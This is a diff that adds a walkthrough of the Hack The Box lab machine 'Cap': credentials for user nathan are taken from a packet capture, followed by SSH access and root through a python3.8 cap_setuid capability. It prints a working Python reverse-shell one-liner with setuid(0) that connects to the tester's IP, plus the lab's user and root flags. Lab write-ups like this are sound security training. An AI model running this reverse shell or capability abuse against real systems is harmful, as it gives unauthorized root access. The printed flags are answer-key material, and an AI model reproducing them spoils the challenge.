@@ -4,7 +4,16 @@ Linux, 20 Base Points, Easy
 ## Machine
 
 ![‏‏Cap.JPG](images/Cap.JPG)
- 
+
+## TL;DR
+
+To solve this machine, we begin by enumerating open services using ```namp``` – finding port ```21```, ```22``` and ```80```.
+
+***User***: By enumerating the website we found a link [http://10.10.10.245/data/0](http://10.10.10.245/data/0) with a PCAP file which includes credentials of ```nathan``` user to FTP/SSH.
+
+***Root***: Found ```/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip``` which is ```setuid``` capability, Create a python script with ```setuid``` command to run the script to get a reverse shell as root.
+
+
 ## Cap Solution
 
 ### User
@@ -129,8 +138,111 @@ Let's try to observe port 80:
 
 ![port80.JPG](images/port80.JPG)
 
-## Cap is still active machine - [Full writeup](Cap-Writeup.pdf) avaliable with root hash password only.
+By clicking on "Security Snapshot (5 Second PCAP + Analysis)" we get the following page:
+![snap.JPG](images/snap.JPG)
 
-Telegram: [@evyatar9](https://t.me/evyatar9)
+Let's download the PCAP file and analyze it using Wireshark.
 
-Discord: [evyatar9](https://discordapp.com/users/812805349815091251)
+From the PCAP we are not able to find any interesting data.
+
+If we navigate to the page [http://10.10.10.245/data/0](http://10.10.10.245/data/0) we get the following wev page:
+
+![data0.JPG](images/data0.JPG)
+
+By analyzing the PCAP file [0.pcap](0.pcap) we can see the following FTP session which includes user name and password:
+
+![ftp.JPG](images/ftp.JPG)
+
+We can get the FTP credentials ```nathan:Buck3tH4TF0RM3!```, Let's use those credentials on SSH:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Cap]
+└──╼ $ ssh nathan@10.10.10.245
+The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
+ECDSA key fingerprint is SHA256:8TaASv/TRhdOSeq3woLxOcKrIOtDhrZJVrrE0WbzjSc.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.245' (ECDSA) to the list of known hosts.
+nathan@10.10.10.245's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jun  9 19:52:20 UTC 2021
+
+  System load:           0.0
+  Usage of /:            35.6% of 8.73GB
+  Memory usage:          35%
+  Swap usage:            0%
+  Processes:             226
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.10.245
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:c1c0
+
+  => There are 4 zombie processes.
+
+
+
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Jun  9 13:45:49 2021 from 10.10.14.8
+nathan@cap:~$ cat user.txt 
+bd61cd6e496fb1d5473af93e64e8e22e
+```
+
+And we get the user flag ```bd61cd6e496fb1d5473af93e64e8e22e```.
+
+### Root
+
+
+By running [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) we can see the following information about [Linux Capabilities](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work):
+```console
+...
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+...
+```
+
+It means we can run ```os.setuid``` command using ```python3.8```.
+
+If we can run ```setuid``` we can write a python script with ```setuid(0)``` command to run commands as a root user.
+
+First, Let's get python revese shell from [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python).
+
+```python
+export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+Now, Let's change from ```python``` to ```python3.8``` and append the command ```os.setuid(0)``` and of course change to our IP:
+```python
+export RHOST="10.10.14.14";export RPORT=4242;python3.8 -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+Listen to port 4242 and run the command:
+```console
+nathan@cap:/tmp$ export RHOST="10.10.14.19";export RPORT=4242;python3.8 -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+And we get a shell as a root:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Cap]
+└──╼ $nc -lvp 4242
+listening on [any] 4242 ...
+10.10.10.245: inverse host lookup failed: Unknown host
+connect to [10.10.14.14] from (UNKNOWN) [10.10.10.245] 51702
+# whoami
+root
+# cd /root
+cd /root
+# cat root.txt
+cat root.txt
+8f8914ebc0ac62e4e52c0cae3c9047f8
+```
+
+root flag ```8f8914ebc0ac62e4e52c0cae3c9047f8```.
